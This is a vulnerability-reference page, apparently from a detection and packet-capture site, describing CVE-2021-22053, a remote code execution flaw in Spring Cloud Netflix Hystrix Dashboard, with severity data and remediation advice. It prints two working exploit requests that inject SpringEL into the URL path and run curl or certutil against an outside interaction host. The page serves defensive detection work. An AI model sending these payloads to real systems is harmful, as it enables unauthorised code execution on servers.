---
layout: "post"
cve_id: "CVE-2021-22053"
title: "Spring Cloud Netflix Hystrix Dashboard <2.2.10 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-22053.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-22053.yaml"
author: "forgedhallpass"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the target system.
"
remediation: "Upgrade to Spring Cloud Netflix Hystrix Dashboard version 2.2.10 or later to mitigate this vulnerability.
"
reference:
  - "https://github.com/SecCoder-Security-Lab/spring-cloud-netflix-hystrix-dashboard-cve-2021-22053"
  - "https://tanzu.vmware.com/security/cve-2021-22053"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-22053"
  - "https://github.com/trhacknon/Pocingit"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 8.8, 'cve-id': 'CVE-2021-22053', 'cwe-id': 'CWE-94', 'epss-score': 0.85682, 'epss-percentile': 0.99343, 'cpe': 'cpe:2.3:a:vmware:spring_cloud_netflix:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'vmware', 'product': 'spring_cloud_netflix'}"
tags:
  - "cve"
  - "cve2021"
  - "rce"
  - "spring"
  - "vmware"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Spring Cloud Netflix Hystrix Dashboard prior to version 2.2.10 is susceptible to remote code execution. Applications using both `spring-cloud-netflix-hystrix-dashboard` and `spring-boot-starter-thymeleaf` expose a way to execute code submitted within the request URI path during the resolution of view templates.  When a request is made at `/hystrix/monitor;[user-provided data]`, the path elements following `hystrix/monitor` are being evaluated as SpringEL expressions, which can lead to code execution.


## ðŸŒ HTTP Request
```nohighlight
GET /hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22curl%20http://d5itm19le0o0ln01all0eqf7t7mufukr8.oast.site%22%29%7D__::.x/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22certutil%20-urlcache%20-split%20-f%20http://d5itm19le0o0ln01all098p3h1f1qbrhq.oast.site%22%29%7D__::.x/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

